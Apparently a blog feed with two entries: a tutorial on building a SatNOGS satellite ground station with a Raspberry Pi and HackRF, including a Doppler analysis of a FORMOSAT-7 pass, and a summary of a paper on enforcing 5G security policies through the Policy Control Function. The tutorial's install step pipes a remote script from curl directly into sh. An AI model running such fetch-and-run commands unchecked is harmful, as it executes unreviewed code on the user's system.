Introducing SatNOGSSatNOGS is a global network of satellite ground stations where users can:(1) build their own ground station, (2) join the global SatNOGS network, (3) receive and upload satellite observation data
Its architecture includes:
SatNOGS Network: scheduling, task assignment, collecting results SatNOGS Client: locally controls the SDR, rotator, and recording SatNOGS DB: the satellite database (frequencies, modulation, TLE, etc.)
Official reference docs - Build SatNOGS - Ground Station Setup
System Architecture As the official docs show, there are multiple choices for building a SatNOGS ground station. The client above can be any Linux device, signal reception uses a software-defined radio plus a signal amplifier, the antenna can be directional or omnidirectional, and you can optionally add a rotator. +---------------------------+ | SatNOGS Network | | - Scheduling | | - Observation database | +------------+-------------+ | | (Observation schedule) v+---------------------+ SatNOGS Client +------------------------------+| Antenna System | <----------------> | SDR (HackRF / RTL-SDR etc.) |+---------------------+ +------------------------------+ | | | RF signal v +-------------------------------> IF samples + decoding + doppler correction + waterfall generation
Explanation:
SatNOGS NetworkBased on satellite TLEs and orbit prediction, it automatically assigns available ground stations to perform observations. SatNOGS ClientLocally controls the SDR, receives signals, performs Doppler correction, and outputs observation results. SDR deviceConverts the RF received by the antenna into baseband / IF (depending on configuration). AntennaDetermines reception quality (gain, directionality, noise, etc.).
The most critical part here:the SatNOGS client must predict antenna direction and Doppler correction based on the TLE to successfully receive satellite signals.
A TLE (Two-Line Element set) contains a satellite’s orbital parameters and the corresponding epoch, describing the satellite’s orbital state at a specific time, serving as a mathematical model for predicting the satellite’s position and motion. So the SatNOGS client computes the satellite’s azimuth and elevation relative to the ground station at each moment based on the TLE. If the ground station has a rotator, the antenna can track the satellite in real time based on the result; even without a rotator, the system can determine when the satellite enters and leaves the ground station’s visible range (AOS/LOS). For Doppler correction, the SatNOGS client uses the TLE to estimate the satellite’s radial velocity relative to the ground station, and from that computes the downlink signal’s Doppler frequency shift. Since low-orbit satellites move at extremely high relative speeds, the frequency shift can reach several kHz or more, so the system needs to dynamically adjust the SDR’s receive center frequency to keep the narrowband downlink signal within the receive bandwidth. System SetupEnvironmentHardware
Raspberry Pi 4 (8G RAM) SDR Device (HackRF One) Antenna
OS/ Software
Raspberry Pi OS Bookworm Ansible SatNOGS client packages
I didn’t use a rotator; I wanted to first cobble together a prototype with the materials I already had, and selectively expand the architecture later. Installing the OS For installing and flashing the image, refer directly to this doc.
You can use Raspberry Pi Imager:
Choose Raspberry Pi OS (other) → Raspberry Pi OS Lite (64-bit)
Settings:
username/password timezone / keyboard Enable SSH Wi-Fi
The official docs note that the currently-supported Raspberry Pi OS version is bookworm, and recommend Lite to save resources.
After installation, you can SSH into the Raspberry Pi. ssh pi@raspberrypi.local
Once in, install the SatNOGS software. sudo apt update && sudo apt -y upgradecurl -sfL https://satno.gs/install | sh -s --
After installation, a config menu should pop up; if not, run this manually. sudo satnogs-setup This command runs an Ansible runbook to run the satnogs-config container.
This configuration isn’t one-time; you can rerun and reconfigure anytime.
Basic ConfigurationChoose Basic Configuration to configure.
In the menu, fill in at least the following (these are the official Basic field descriptions):
Setting Description
SATNOGS_API_TOKEN your Network API token
SATNOGS_STATION_ID / LAT / LON / ELEV station info
SATNOGS_SOAPY_RX_DEVICE which SDR you use, RTL-SDR: driver=rtlsdr, HackRF: driver=hackrf
SATNOGS_ANTENNA RTL-SDR: RX, HackRF: TX/RX
SATNOGS_RX_SAMP_RATE sample rate. RTL-SDR commonly: 2.048e6 (official recommendation), HackRF: 8e6
The SATNOGS_API_TOKEN and other station info above require you to register an account on SatNOGS Network and create your ground station, after which you get the API key.
Also, a little tip here: Check available antennas: SoapySDRUtil --probe 2>&1 | grep Antennas Check supported sample rates: SoapySDRUtil --probe 2>&1 | grep Sample
Advance Configuration Advanced configuration is up to you. For example, if you have a rotator you can set its baud rate and port here. Or if you want to change the final waterfall’s MAX/MIN Power, you can set it here. Or adjust the log level here. But we’ll keep everything at default for now. After configuring, Exit, and the system applies the changes, which may take a few minutes. HackRF ConfigurationIn my setup the HackRF connects to the Raspberry Pi over USB, so I need to ensure the HackRF is usable. Problems I repeatedly hit during setup were:
The container/system can’t see the SoapyHackRF driver It can see the USB but the permissions are wrong (udev rules / group)
Installing the HackRF Soapy module Ref: https://community.libre.space/t/hackrf-with-satnogs-installation-needed/11105
On Bookworm the package name may be soapysdr-module-hackrf or versioned (e.g. 0.7/0.8), so I recommend this: sudo apt updateapt-cache search hackrf | grep -i soapysudo apt install -y soapysdr-tools hackrf <the soapy-hackrf package name you found>
After installing, you can verify on the host. SoapySDRUtil --probe="driver=hackrf"hackrf_info
Setting up udev rules + plugdev If SoapySDRUtil can see it but SatNOGS / the container can’t, nine times out of ten the udev permissions are the problem.
Confirm the udev rules are consistent. sudo udevadm control --reload-rulessudo udevadm trigger
Then add the satnogs user to plugdev. sudo usermod -a -G plugdev satnogs
Finally, reboot to apply the changes. reboot
Verifying the installationAfter rebooting, first check the network. ping -c 3 network.satnogs.orgcurl -I https://network.satnogs.org
Then confirm satnogs-client is running. kevin@kuangsin:~ $ sudo docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES727ef9146ce7 librespace/satnogs-client:2.1.1 "satnogs-client" 4 minutes ago Up 4 minutes satnogs_satnogs-client674cf098dbfc librespace/hamlib:4.5.4 "/docker-entrypoint.…" 4 minutes ago Up 4 minutes satnogs_rigctld
Confirm the HackRF can be detected inside the container. sudo docker exec -it satnogs_satnogs-client SoapySDRUtil --probe="driver=hackrf"
If this line can see the HackRF, the udev setup is correct. Output: ######################################################## Soapy SDR -- the SDR abstraction library ########################################################Probe device driver=hackrf[INFO] Opening HackRF One #0 46d067dc36692347...------------------------------------------------------ Device identification---------------------------------------------------- driver=HackRF hardware=HackRF One clock source=internal part id=a000cb3c004b4356 serial=000000000000000046d067dc36692347 version=2018.01.1------------------------------------------------------ Peripheral summary---------------------------------------------------- Channels: 1 Rx, 1 Tx Timestamps: NO Other Settings: * Antenna Bias - Antenna port power control. [key=bias_tx, default=false, type=bool]------------------------------------------------------ RX Channel 0---------------------------------------------------- Full-duplex: NO Supports AGC: NO Stream formats: CS8, CS16, CF32, CF64 Native format: CS8 [full-scale=128] Stream args: * Buffer Count - Number of buffers per read. [key=buffers, units=buffers, default=15, type=int] Antennas: TX/RX Full gain range: [0, 116] dB LNA gain range: [0, 40] dB AMP gain range: [0, 14] dB VGA gain range: [0, 62] dB Full freq range: [0, 7250] MHz RF freq range: [0, 7250] MHz Sample rates: 1, 2, 3, 4, 5, ..., 16, 17, 18, 19, 20 MSps Filter bandwidths: 1.75, 2.5, 3.5, 5, 5.5, ..., 14, 15, 20, 24, 28 MHz------------------------------------------------------ TX Channel 0---------------------------------------------------- Full-duplex: NO Supports AGC: NO Stream formats: CS8, CS16, CF32, CF64 Native format: CS8 [full-scale=128] Stream args: * Buffer Count - Number of buffers per read. [key=buffers, units=buffers, default=15, type=int] Antennas: TX/RX Full gain range: [0, 61] dB VGA gain range: [0, 47] dB AMP gain range: [0, 14] dB Full freq range: [0, 7250] MHz RF freq range: [0, 7250] MHz Sample rates: 1, 2, 3, 4, 5, ..., 16, 17, 18, 19, 20 MSps Filter bandwidths: 1.75, 2.5, 3.5, 5, 5.5, ..., 14, 15, 20, 24, 28 MHz
ObservationsWhen setting up a ground station, you need to register an account on SatNOGS Network and create your ground station.
After creating an account and logging in, choose Add Ground Station from the main page.
General Information: fill in the station name and description Configuration: fill in the station’s latitude, longitude, and elevation Antenna: choose your antenna type
The other settings and image are up to you. Once created, you get a Ground Station ID, which you need to enter in your client via satnogs-setup. You also need to enter the API key into your client config. Scheduling observations In SatNOGS Network, you can schedule observations under Observations > Schedules: choose the satellite you want to observe, choose the transmitter and which ground station to observe with (just choose your own), then choose start and end times. When you click calculate, the timeline below shows the schedulable times; for convenience I always select all and click Schedule. After scheduling, your ground station observes at the specified times, and the results appear under Recent Observations on your main page.
Observation resultsThe target this time was Taiwan’s FORMOSAT-7 (COSMIC-2), with a downlink frequency of 400.9000 MHz (CW). In the waterfall image, you can clearly see a continuous, smoothly-curved high-energy trace, representing the satellite’s downlink carrier frequency producing a noticeable Doppler shift over time as it passes overhead. Observation details
During the early AOS (Acquisition of Signal) phase, the satellite approaches the ground station at high speed, with a negative relative velocity, shifting the received frequency below the nominal frequency. As the satellite’s elevation rises and approaches its highest point (Max Elevation ≈ 78°), the relative radial velocity approaches zero, and the frequency shift gradually returns near the center frequency. When the satellite starts moving away into the LOS (Loss of Signal) phase, the Doppler shift reverses direction, and the received frequency gradually shifts above the nominal frequency.
This phenomenon is completely consistent with low-orbit satellites’ high speed of about 7–8 km/s, and verifies the correctness of the SatNOGS client’s orbit prediction and real-time Doppler correction based on the TLE. The overall frequency trace is continuous and stable, showing that the ground station’s time synchronization, TLE freshness, and SDR settings are all within acceptable ranges.
What is the bright line in the middle? It’s the satellite’s CW carrier. Since the satellite moves at high speed with a changing relative velocity, per the Doppler shift formula: $ \Delta f = \frac{v}{c} f_0​$
$\Delta f$ is the shifted frequency in Hz. It represents the difference between the actual received frequency and the satellite’s nominal downlink frequency, i.e. $f_{\text{received}} - f_0$ $v$ is the satellite’s velocity component relative to the ground station, not the satellite’s total velocity, but the velocity component along the ground-station ↔ satellite line of sight approaching you → $v < 0$ (frequency decreases) moving away → $v > 0$ (frequency increases) directly overhead → $v ≈ 0$
$c$ the speed of light, about $3 × 10^8 \text{m/s}$ $f_0$ the satellite’s nominal downlink frequency; for this observation $f_0 = 400.900Mhz$, from the satellite’s specs
The nominal downlink frequency is usually the theoretical downlink frequency defined in the satellite’s documentation, but in reality there’s the Doppler effect, and the satellite and ground station aren’t relatively stationary, so the frequency always shifts, making it unlikely to see the carrier exactly centered at 400.9 MHz.
We can plug in the observed numbers to verify. A low-orbit satellite’s speed is about $v_{\text{orbital}} \approx 7.5 \text{ km/s}$, i.e. $7500 m/s$. $ \Delta f = \frac{7500}{3 x 10^8} \cdot 4.0009 \times 10^8$ gives a $\Delta f$ of about $10022.5$ Hz, i.e. $10$ kHz, consistent with the shift range observed in the image (-10kHz ~ +10kHz). Audio, Text and Metadata The audio received this time wasn’t decodable digital data, but the result of the Doppler-shifted carrier signal converted into the audio band. As the satellite approaches the ground station, the pitch gradually rises and peaks near maximum elevation; then it gradually falls as the satellite moves away. This phenomenon is completely consistent with the Doppler effect when a low-orbit satellite passes a ground station, showing the RF carrier tracking is working.
The received data isn’t a valid telemetry packet; FORMOSAT-7 probably uses a CW beacon at this frequency rather than a decodable digital modulation format, so only sporadic symbols appear. This also means RF reception succeeded, but the modulation and decoding settings need to match the satellite’s spec.
Criteria: no sidebands, no symbol pattern, no framing structure. Plus a very thin, continuous, non-splitting bright line, which is the typical feature of a CW (Continuous Wave) or unmodulated beacon.
Metadata
The observation used a HackRF SDR at an 8 MHz sample rate, with the center frequency set to 400.900 MHz, and Doppler correction enabled based on TLE data from Space-Track.org.
ResultsThrough this hands-on build and observation, I cobbled together a simple small ground station and successfully observed and received a low-orbit satellite signal, verifying the station’s overall RF reception and tracking ability during a low-orbit pass. From the waterfall image I obtained a continuous, extremely narrowband carrier trace whose frequency shows a smooth Doppler shift over time, showing the system can correctly do frequency tracking and Doppler correction based on the TLE. Although the received audio wasn’t decodable digital telemetry but the result of the Doppler-shifted carrier converted to the audio band, it successfully verified the station’s operation at the orbit-prediction, Doppler-compensation, and RF-reception levels, which is a result that meets expectations. To further improve the station’s observation capability, in the future I hope to add a rotator so the antenna tracks the satellite in real time, improving link quality and signal stability during low-elevation passes. I should also further confirm the satellite’s actual modulation and framing spec, set up the corresponding demodulator and decoder, and try to decode the actual telemetry data.

entry.title: Security policies definition and enforcement utilizing policy control function framework in 5G
entry.content:
🌐 中文版：繁體中文
:root{ --maincolor: #50fa7b; } .info{ padding: 15px; margin-bottom: 20px; color: #ffffff; border: 1px solid transparent; border-radius: 10px; background-color: #343232; border-color: #b8bdb4; } .special{ border-bottom: 3px solid var(--maincolor); color: inherit; text-decoration:none; } .newbold{ color: #ffffff; font-weight: bold; text-decoration:none; } a{ color: #337ab7; text-decoration: none; }
1. IntroductionThis paper discusses network-security issues within the scope of the 3GPP-defined 5G System (5GS). 5G standardizationMany organizations and bodies have made outstanding contributions to developing the 5G architecture, especially on the security side: - ITU- ETSI- IETF- NGMN- 5G-PPP- NIST- GSMA, etc.
Some are responsible for specific infrastructure like critical infrastructure, and others develop security standards for specific use cases.
S3A Working Group → defines the end-to-end security aspects of 5G networks
5GS5G System = Access Network + Core Network + UESystem Architecture → Service-Based Architecture → is composed of multiple NFsIn the SBA architecture, the interaction between different NFs can be represented by a point-to-point reference point between two NFs.The SBI (Service-based Interface) represents how a given NF provides or exposes a set of services. The Policy Control Function (PCF) is a network function providing a unified, consistent framework to define any type of policy. In previous mobile-network generations, PCF was only used for QoS or charging policy formulation. The 5G architecture adds a service for network data analytics, via a new NF, NWDAF (Network Data Analytics Function), used for 1. Load Level information2. Service experience3. Network performance4. Abnormal behavior
PCF can subscribe to network-analytics notifications related to such information and use it to compute or update policies, but this isn’t yet standardized.There’s no clear link established between the new unified policy-control framework, the 5G system, and the enhanced data-analytics entity, and this paper’s results can help make these three areas more tightly connected. The main goal is to find an effective security-enforcement schema to flexibly create new security policies and dynamically respond to the continuously changing security environment across the 5G end-to-end architecture. Security enforcement across the 5G system should be discussed at the TSG-SA level. In the 5GS architecture, user-plane security enforcement is based on whether the confidentiality and integrity algorithms over the air interface between the UE and base station are enabled. The UP integrity-protection algorithm can be enabled selectively (e.g. per slice). Network slicingIndividual network slices providing different services may have different security requirements and use different security protocols and methods; so providing different levels of security protection for different network slices is key. The use of security-encryption algorithms is also optional (e.g. 128-bit vs 256-bit key length), as the security requirements of critical infrastructure differ from those of enhanced Mobile Broadband’s high-usage scenarios. Applying QoS principles to security, the goal should be to use the unified policy-control framework and the new data-analytics function as a knowledge base about the network and UE, to realize effective security-policy definition and enforcement in the 5G end-to-end architecture. Current protection strategies for telecom networks are nothing more than firewalls, IDS, DDoS protection systems, etc., managed by vendors’ specific management tools. These security functions are for protecting the whole network or based on their positioning in the network, without considering individual UEs.
The ability to detect a security issue on a single UE The way to apply remediation to a single UE have so far been problems
This study fills these mechanisms, enriches security from an end-to-end network perspective, and provides appropriate granularity to consider individual UEs’ security policies→ helpful for uRLLC and mMTC deployment scenarios
2. Challenges to apply end to end security enforcement in 5GTo realize end-to-end security enforcement, there are four major challenges to solve: - Applying QoS principles to security enforcement- Session management and user plane- Policy control- Network analytics
2.1 Challenges to apply QoS principles to security enforcementWhen applying the fundamental principles of QoS enforcement to security enforcement based on business needs (e.g. generated in vertical markets), one of the main difficulties is being able to measure security characteristics in a way similar to how QoS is quantified in the network. A QoS profile is well-defined as a set of QoS parameters applied to a QoS flow (a QoS flow is the finest granularity of QoS differentiation in a packet data unit (PDU) session). This parameterization is quantitative, i.e. measurable by numbers. For example, the 5G QoS Identifier is a scalar-represented parameter used as a reference for 5G QoS characteristics (like scheduling, weight, admission threshold, etc.). There are even preconfigured standardized values. But how do you build a security profile in the 5G architecture, how do you establish a quantified security parameterization for aspects like integrity protection, confidentiality protection, access control, or malware detection? Our proposal to solve this is presented in section 3.1. 2.2 Challenges at session management level to enforce security controlsThe SMF receives requests from the UE to establish a PDU session.However, current PDU requests don’t contain any security parameters. So it’s impossible for a UE to request specific 5G UP security services, i.e. a “secure PDU.”Yet things like government critical infrastructure may require special security measures for the PDU session between the UE and the Data Network, for example certain Data Radio Bearers supporting strong encryption algorithms or longer encryption keys in certain services. When establishing a PDU session, the SMF, based on - subscriber info from UDM- the locally-configured UP security policy per DNN/SMF slice- the maximum data rate each UE supports provides UP security enforcement in the PDU session to offer integrity protection on each DRB.The SMF’s local configuration is considered a globally-applicable static policy. The question is whether this static approach is still valid for later use cases, where subscription plans may require different levels of security (e.g. per slice) along with security value-added services and the corresponding tenants (e.g. critical-infrastructure owners), and the ability to react to security events. These use cases need flexible, scalable, dynamic policy management and configuration.Furthermore, security enforcement only indicates whether to apply UP integrity and confidentiality protection in the NG-RAN network area, and only applies to 3GPP-type access. Extending UP security enforcement from NG-RAN to transport and the core network is a challenge(i.e. the end-to-end security-enforcement method for the overall connectivity the PDU session provides is a challenge). Figure 2 shows current UP security enforcement and considerations.
Once a PDU session is established,the current session’s characteristics (i.e. PDU session info) are limited to some mainly QoS-related information elements (e.g. QoS Flow ID, Reflective QoS Indicator).When a PDU-level security event occurs, there are no security attributes to trigger mitigation measures.For example, when an application processes data classified as confidential, special security measures are needed within the PDU session between the UE and the Data Network, like strong encryption algorithms or longer keys used in the services the DRB supports.
Section 3.2.5 develops a framework to provide security attributes for PDU-level security events.
2.3 Challenges to fine security policies under policy control frameworkAlthough defining a security policy for each subscription is laborious, it doesn’t seem much different from doing it for QoS.It can be expected that security policies and QoS aren’t truly independent, and that the same policy can be applied to a large number of subscriptions, e.g. per slice. A Policy and Charging Control rule (PCC rule) contains the information needed to enable user-plane detection, policy control, and appropriate charging for service data flows. Two kinds of PCC rules exist: dynamic and predefined.Dynamic rules are provided by the PCF to the SMF, while predefined PCC rules are configured into the SMF. When a dynamic rule and a predefined PCC rule have the same priority, the dynamic rule takes precedence.The targets of these policies are:
PDU sessions Service Data Flows (SDF). Set of PDUs (within a PDU session) identified by traffic filters
Whether PCF control applies to a PDU session is defined by SMF policy based on DNN or per slice.Without PCF control, local policy-based rules are configured in the SMF. A PCC rule definition includes:
Service data flow detection mechanism (e.g. filters, application template) Charging-related Information Elements (IEs) Policy-control-related IEs (e.g. Gating, QoS, bit rates, etc.)
A service data flow filter contains the user-plane data for matching IP PDU traffic and Ethernet PDU traffic.The SMF applies the Service data flow template information within the enabled PCC rule to instruct the UPF to identify packets belonging to a specific service flow. The appropriate definition of security information elements as part of a PCC rule is a key challenge. Currently the PCC rules defined by 3GPP TS 23.503: Technical Specification Policy and Charging Control Framework for the 5G System don’t explicitly contain such parameters, nor are they part of service-data-flow detection able to identify security events, or part of policy-control operations. Furthermore, the SMF sends PCF information about the PDU session state (e.g. access type, roaming, IP address, etc.), so the PCF can react dynamically based on specific triggers and change policies accordingly. So the definition of security triggers is very important, since it affects not only the network’s security state but also the network’s overall QoS and SLA (e.g. DDoS attacks). However, creating these security triggers (e.g. recently-discovered vulnerabilities, fraud, attacks, unauthorized access, etc.) is a challenge; configuring part of the detection filters in the UPF or other specific security probes, whose policy goal is to include the security-assurance aspect in the network’s overall service assurance. ⚠️The current problem is: how do you make security part of the PCF’s PCC decision process?This paper provides an answer in section 3.3. 2.4 Challenges to introduce security use cases under network analyticsThe Network Data Analytics Function (NWDAF) appeared in the SBA architecture in Release 15. There can be multiple NWDAFs specialized for different types of analytics, identified by an Analytics ID Information Element (IE). This IE identifies the type of supported analytics an NWDAF can generate. The NWDAF interacts with different entities for different purposes, such as data collection based on subscribing to events provided by different network functions, retrieving information from data repositories and NFs, and providing analytics on demand to different types of consumers. Currently the NWDAF’s data-collection function only allows obtaining data for a slice or UE from control-plane sources, but how to collect user-plane security data from the UPF isn’t yet standardized, which is actually currently limited to traffic and data rates. The OAM (Operation, Administration and Management) system only measures and traces data, which can be shared with the NWDAF via a Management Service. For security-analytics purposes, information collected from user-plane traffic analysis about malware, botnets, protocol anomalies, etc., for example via the security probes proposed in [18] (like an IDS embedded in the UPF) or malware sandboxes, would be very useful to enhance network analytics with new security use cases. This analytics information revolves around a network slice’s load level, service experience, network performance, mobility, QoS, UE behavior, etc., providing a valuable knowledge base. Three fundamental questions are raised within this paper’s scope: - How to obtain security-related information based on the analyzed knowledge?- What specific new security parameters can be monitored and further analyzed in the NWDAF?- How can the PCF use this information to configure and enforce security policies in the 5G end-to-end architecture?
3. Proposed approach to security enforcement in 5GFrom an implementation perspective, so far the realization of security policies and QoS parameters in mobile networks has varied greatly across the network. The 5G PCF is a single framework to define any type of policy and deliver it to other NFs on the control plane. From a near-future perspective, when the subscription plans tenants demand will need to include security clauses, i.e. security as an important part of the SLA like QoS today, we propose a new security-enforcement approach that uses the unified policy-control model. 3.1 Application of QoS policies to security use cases- session-AMBR- UE-AMBR
Our proposal is that these QoS policies can be applied from the PCF into the network in a restricted and dynamic manner upon receiving security events, which can be established in the NWDAF or other security-analytics platforms on the user plane (e.g. SIEM tools placed in the management plane, IDS systems embedded in the UPF, etc.). Based on predefined security metrics, different policies can be enforced from the PCF, acting as effective mitigation mechanisms in the network:
Set a new session AMBR Set a new UE AMBR, which is a kind of isolation of the UE (e.g. a UE acting as an active bot in a DDoS attack) Use stricter security controls within the QoS Profile to set up a new PDU session
QoS profiles can be dynamically established in the 5G AN by the SMF; specific QoS rules can be enforced on the UE via session-management signaling on the N1 interface from the SMF, or directly on the UPF on the N4 interface. N1 interface: UE $\leftrightarrow$ AMFN4 interface: SMF $\leftrightarrow$ UPF, to manage data sessions in the user planeN4 is based on the PFCP protocol (Packet Forwarding Control Protocol) The SMF does manage QoS flows via rules, associating traffic filters with QoS policies from the PCF.The traffic-filter set is configured in the UPF and can be used to easily manage security services. For example:
a security association identified by a specific security-parameter index for a specific set of UEs or slices with special security requirements (e.g. encryption algorithm, key length, etc.) detection and dynamic QoS rules like traffic control can be applied dynamically
The flowchart below depicts the concept of applying security rules as part of QoS policies in the network: The figure below shows the secure-call steps realizing the above concept: 1.a NWDAF → PCFThe PCF subscribed to NWDAF notifications.Due to a network security event (e.g. DDoS), we find a user-data congestion situation, sent to the PCF via the N23 interface. 1.b Security Management → PCFThe security-management system is integrated with the PCF via a REST API.The security event is reported to the PCF. 1.c PCF → UDR(optional)The PCF requests a set of data from the UDR via the N36 interface.In this use case, the requested data can be the ID of the security-policy part of the subscription-policy set, to apply when a security event occurs. 2. PCF → SMFAfter the PCF makes a policy decision, it determines the SMF needs updated policy information to mitigate the security issue, and sends an Npcf_SMPolicyControl_UpdateNotify request via the N7 interface containing updated policy info about the PDU session, in this case establishing a new Session AMBR. 3. SMF → PCFThe SMF responds to the PCF with an ACK. 4.a SMF → UPFQoS enforcement based on the QoS Enforcement Rule sent by the SMF is a function provided by the UPF, including the Session AMBR over the N4 interface (received in Step 2 from the SMF, which came from the PCF). 4.b SMF → UEExchanging N1 SM signaling with the UE via the AMF to provide the UE QoS rules,e.g. setting a new UE-AMBR to limit the maximum bit rate expected to be provided for all Non-GBR QoS Flows across all the UE’s PDU sessions. 4.c SMF → 5G ANExchanging N2 SM signaling with the 5G-RAN via the AMF to set the 5G RAN’s QoS parameters,e.g. reserving resources for a specific traffic type. 3.2. User plane security enforcement and assuranceThe way to enforce security policies on UP traffic is also based on policy control. It acts directly on control NFs like the AMF and SMF, and the PCF should reach the UE, RAN, and UPF to apply these policies directly on the UP. 3.2.1. Security policies enforcement via AMF Two categories of policies are for access and mobility management.They’re enforced by the AMF, prescribed by the PCF, and stored in the UDR.They can support security use cases without major changes to the policy definitions:
Policies transferred from PCF to AMF:
Service area restrictions A Tracking Area is a logical regional concept in which a user can move without updating the management node; the network allocates one or more TAs to the user. Service area restriction includes allowed areas and non-allowed areas. This paper proposes using specific thresholds to establish security levels for different service areas, to decide whether a user is authorized to move to a high-security service area. Example: geographically sensitive areas like critical infrastructure may restrict access for users using the “Null Schema” to generate SUCI, to prevent effects like a malicious base station; in other words it may allow access for users supporting UP integrity protection. Priorities of area types the user may use Appropriate priority definitions can avoid downgrade attacks that force the UE to connect to more vulnerable networks (like 2G), which are more susceptible to attack than 4G/5G networks. An attacker can attempt a downgrade attack by making the UE and network entity each believe the other doesn’t support a security feature, even if both actually do support it. The Anti-Bidding down Architecture was defined in Release 15 but isn’t truly in effect yet, since its purpose is to prevent downgrading from future enhanced security features to current ones.
Policies transferred from PCF to the UE via AMF
User Equipment Route Selection Policy to determine how to route egress traffic (PDU selection policies) When a security event occurs, it may trigger a new PDU session (e.g. malware detection in the UE), i.e. an isolated PDU with a special policy on the data path, or even a PDU terminated in a secure DN with special security services
The LADN (Local Area Data Network) concept is used in 5G to support MEC, and supports the practice of the above measures. LADN enforces restrictions only on PDU sessions authorized in a certain set of locations (called LADN Service Areas). LADN Service Areas are configured in the AMF per DNN, and the AMF provides the UE the LADN Service Area information. 3.2.2. Security policies enforcement via SMF SMF function intro: the SMF controls the signaling needed for a PDU session (via N4 signaling) and sets up the user-plane handling in this PDU session (selecting the UPF supporting the PDU session).
So the SMF controls the functions the UPF supports, including security-related functions like firewall, traffic saving, DDoS protection, GPRS Tunneling Protocol (GTP), (the new Inter-PLMN UP Security in Release 16), etc. Furthermore, it controls policy enforcement, i.e. interacting with the PCF to get policies and applying them directly to the UPF (via N4) or to other parts of the NG-RAN network via the AMF.
Proposal: the proposal is that security controls embedded in the UPF can be managed via security policies in the PCF.
Furthermore, this new concept will make the user-plane security enforcement policies in the air interface (confidentiality and integrity protection) managed in the PCF (rather than locally configured in the SMF as today), coming from the UDR (as the storage of policy-configuration files with predefined security policies). So these policies should be part of Dynamic PCC rules dedicated to user-plane security, and may extend to other domains or UP interfaces, like:N6: UPF $\leftrightarrow$ Data Network, based on IP or Ethernet transportN3: UPF $\leftrightarrow$ 5G-RAN, based on GTPv1-U (GPRS Tunneling Protocol User Plane)N9: UPF $\leftrightarrow$ UPF, to transport user-plane data, based on GTPv1-U 3.2.3. UP security enforcement use casesThe N6-LAN for the 5G concept should allow the PCF to configure the UPF to realize a security service function chain to the data network.
N3 interface protection mechanisms: TS33.501 states that data transmission over N3 (UPF $\leftrightarrow$ RAN) should have confidentiality, integrity, and replay-attack protection. The required mechanisms are IPSec ESP and IKEv2 certificate-based authorization, but which cryptographic mechanism protects N3 is up to the operator’s decision.
In the near future, these types of solutions can be selectively deployed based on the security level provided to a set of users, slices, and/or tenants, depending on the service’s or infrastructure’s requirements and importance. For example:a dedicated network serving critical infrastructure (e.g. utilities), or a vehicular ad-hoc network (VANET), certainly needs comprehensive protection for communication between the radio base station and the core network.
Proposal: this paper’s proposal is to include the encryption solution for N3 in PCC rules, enforced in the gNB (via AMF) and the security gateway in the UPF system (via SMF); enforcement should establish a new IPSec tunnel or assign the PDU to an existing IPSec tunnel.
The same concept can also apply to the security methods used in some N9 use cases, like interconnection between different operators. In this case GTP inspection and IPSec have been standardized, but not enforced via the PCF as part of a “security SLA.” Furthermore, via new analytics functions (like NWDAF) or databases (like UDSF, Unstructured Data Storage Function) to store session data or security events received from the UPF or other specific security-analytics platforms (which can correlate events from multiple sources), the PCF can react to changes in the established Security SLA (SSLA) queried from the UDR, applying new security policies and forcing the establishment of a new, more secure PDU, i.e. mitigating the security issue that triggered the action.
Ex:When a fake base station is detected in a certain regional network,or simply for a critical area from a security perspective (e.g. airport, critical infrastructure site, etc.),the PCF will enforce integrity protection for the relevant UE/UE group attached to the base stations in that geographic area. Other constraints can also build effective use cases (e.g. a UE connected to a critical slice). The UE's policy should be updated from "not needed" to "preferred" or "required."
The figure below shows the PDU session establishment flow, with the calls this paper proposes shown in bold, to provide the dynamic enforcement of the described security policies from the PCF.
3.2.4. Security assuranceOnce a PDU session is established with security attributes (e.g. encryption, integrity protection, access-control policy for a specific service flow, etc.), allowing security enforcement in an extended sense in the network, two key aspects remain worth attention, namely security data collection and closed-loop automation. To introduce them, the Charging Function (CHF) is used as an analogy.
Usage data collection can be used for charging, collecting statistics, and monitoring overall network usage and UE behavior.When a user exceeds certain thresholds (e.g. a spending limit), the CHF notifies the PCF, which considers this in dynamically applying relevant policies to the user session, e.g. QoS limits on a given PDU session, redirecting to the operator’s web page, etc.
Proposal: use security-related data from the embedded security functions in the UPF to enhance/enrich data collection.
The SMF collects enhanced/enriched data from the UPF and sends it to a central security-management system (storing the data and correlating it with security information collected by various security-dedicated platforms in the network), e.g. firewall logs, security telemetry, IDS logs, etc. The security-management system is responsible for creating security events and triggering operations on the PCF and/or SMF,e.g. notifying the PCF that some security SLA has been crossed, redirecting user traffic to a scrubbing center or a dedicated secure DN, etc. In 5G, the UPF takes on the role of the traffic-detection function in the 4G Evolved Packet Core, i.e. packet inspection (e.g. application detection based on service data flows), so it can enforce PCF policies. Indeed, the technologies implementing the UPF integrate more and more security functions, like firewall or carrier-grade network address translation. The 5G core allows the PCF to coordinate between connection-related policies sent to the UE and policies sent to the network, which can be deployed in the UPF on the user plane, e.g. security policies in an L7 firewall embedded in the UPF, for a specific service for a specific user. The following two use cases illustrate this concept: use case1Per 3GPP TS 23.503, one of the functions the PCF supports for SMF Selection Management of PDU sessions is providing a policy to the AMF to notify the PCF to perform DNN replacement for a specific DNN. The trigger for such a replacement operation may be a DNN compromised by a security event, due to a specific DN or slice overload (e.g. DDoS), reported to the PCF via the NWDAF. use case2When the SMF receives a PCC rule, the SMF can take measures to reconfigure the PDU’s UP. One of these actions can be updating the UPF with a new steering rule, e.g. forwarding certain suspicious traffic to a local data center (e.g. MEC), to contain a potential security breach within a small, controlled area of the network. The MEC concept is to facilitate deploying the UPF at the network edge, closer to the UE, sometimes for critical applications,e.g. ultra-low-latency use cases, caching, stadiums, etc. As a response to an event, the Application Function (AF) can make a request to the 5G core (i.e. PCF or via the Network Exposure Function (NEF)) to steer the traffic of a set of UEs or even an entire slice to a UPF located at the edge, where security functions like DDoS protection, scrubbing centers, IDS/IPS, etc. can be deployed as containment mechanisms.
AF function: AFs interact with the 3GPP core to provide services, like an application’s influence on traffic routing, accessing the NEF, interacting with the policy framework (via N5), etc., i.e. it requests dynamic policies.Today, the AF acts as a MEC orchestration application or IP Multimedia System (IMS).
Proposal: extend the AF’s scope to security applications:
Influence on traffic routing as a security-mitigation mechanismExample: BGP injection and route changes when an attack (e.g. DDoS) is detected Accessing the 5G core via the NEFExample: a third-party security company providing a threat-intelligence feed Interaction with the policy frameworkExample: a policy change providing new SDF filtering rules due to an unpredictable security event or a new threat signature
